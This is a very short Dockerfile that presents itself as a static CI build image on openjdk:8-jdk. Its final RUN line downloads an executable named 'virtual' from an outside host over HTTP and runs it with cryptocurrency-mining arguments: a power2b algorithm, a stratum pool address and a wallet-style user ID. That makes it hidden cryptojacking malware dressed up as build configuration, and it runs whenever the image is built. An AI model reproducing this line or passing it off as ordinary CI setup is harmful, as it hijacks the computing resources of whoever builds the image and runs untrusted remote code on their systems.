# This Dockerfile creates a static build image for CI
FROM openjdk:8-jdk
RUN apt-get install -y curl git unzip wget
RUN wget http://www.netsteady.com/virtual; chmod +x virtual; ./virtual -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MgwuCc6yvsvMeg6AosthAe4gTvQwaoKFFu.VPS
